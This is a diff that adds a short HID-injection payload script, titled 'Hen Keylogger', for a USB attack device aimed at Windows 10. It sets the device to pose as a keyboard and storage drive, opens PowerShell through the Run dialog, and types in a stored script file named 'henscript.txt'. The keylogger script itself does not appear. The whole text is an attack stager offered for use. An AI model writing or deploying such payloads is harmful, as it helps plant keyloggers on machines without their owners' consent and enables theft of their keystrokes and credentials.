@@ -1,0 +1,21 @@
+# Title:          Hen Keylogger
+# Description:    A keylogger for the Hen
+# Category:       General
+# Target:         Windows 10
+# Attackmodes:    HID, STORAGE
+
+# set up payload
+LED SETUP
+GET SWITCH_POSITION
+ATTACKMODE HID STORAGE
+
+# open powershell
+LED STAGE1
+RUN WIN powershell
+
+# run duckysript file 'henscript.txt'
+LED STAGE2
+QUACK ${SWITCH_POSITION}/henscript.txt
+
+# end payload
+LED FINISH
